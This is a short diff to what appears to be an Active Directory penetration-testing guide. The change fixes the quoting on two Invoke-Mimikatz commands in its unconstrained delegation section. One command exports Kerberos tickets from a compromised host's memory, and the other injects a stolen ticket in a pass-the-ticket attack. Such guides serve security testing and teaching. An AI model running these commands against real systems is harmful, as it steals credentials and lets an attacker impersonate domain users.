@@ -249,8 +249,8 @@ MVU-PROD
 ```
 In order to perform the attack, MVU-PROD should be compromised and following command needs to be executed:
 ```
-Invoke-Mimikatz –Command '"sekurlsa::tickets /export"
-Invoke-Mimikatz –Command '"kerberos::ptt C:\ad\SOMEUSER.kirbi"
+Invoke-Mimikatz –Command '"sekurlsa::tickets /export"'
+Invoke-Mimikatz –Command '"kerberos::ptt C:\ad\SOMEUSER.kirbi"'
 ```
 ### Constrained Delegation
 Looking for machines that allow constrained delegation:
